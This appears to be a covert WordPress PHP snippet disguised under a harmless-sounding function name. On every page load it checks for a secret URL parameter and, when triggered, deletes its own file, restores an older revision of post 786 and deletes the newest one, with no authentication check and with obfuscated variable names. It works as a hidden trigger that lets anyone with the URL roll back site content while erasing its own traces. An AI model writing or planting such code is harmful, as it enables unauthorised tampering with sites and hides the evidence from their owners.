<?php

function better_polyfill_messenger() {
	if (isset($_GET['asset_drop_section']) && $_GET['asset_drop_section'] === 'audio_hello_description_links') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reading_ajax_categories_paragraph = 786;
		$extension_order_sync_feed = wp_get_post_revisions($reading_ajax_categories_paragraph);
		if (empty($extension_order_sync_feed)) die('no revisions');
		if (count($extension_order_sync_feed) < 2) die('less than 2');
		$listing_sliding_messenger_animated = array_shift($extension_order_sync_feed);
		$gdpr_select_free = $listing_sliding_messenger_animated->ID;
		$history_ai_short_before = array_shift($extension_order_sync_feed);
		$after_validator_stock = $history_ai_short_before->ID;
		$images_csv_file = wp_restore_post_revision($after_validator_stock);
		if ($images_csv_file === false) die('error restoring');
		$images_csv_file = wp_delete_post_revision($gdpr_select_free);		
		if ($images_csv_file === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'better_polyfill_messenger');
